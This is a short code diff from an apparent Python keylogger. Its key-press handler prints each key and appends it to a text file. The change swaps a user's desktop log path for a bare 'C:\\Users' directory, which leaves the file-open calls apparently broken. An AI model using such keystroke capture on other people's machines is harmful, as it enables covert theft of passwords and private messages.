@@ -17,7 +17,7 @@ def when_pressed(key):
     try:
         print("Pressed key: {0} ".format(key.char))
         file = open(
-            "C:\\Users\\VATAN\\OneDrive\\Masaüstü\\d\\pressed_keys.txt", "a", encoding="utf-8")
+            "C:\\Users", "a", encoding="utf-8")
         if new_line:
             file.write("\n" + key.char)
         else:
@@ -25,7 +25,7 @@ def when_pressed(key):
     except AttributeError:
         print("Pressed key: {0} ".format(key))
         file = open(
-            "C:\\Users\\VATAN\\OneDrive\\Masaüstü\\d\\pressed_keys.txt", "a", encoding="utf-8")
+            "C:\\Users", "a", encoding="utf-8")
         file.write("\n" + str(key) + "\n")
     last_time = current_time
 
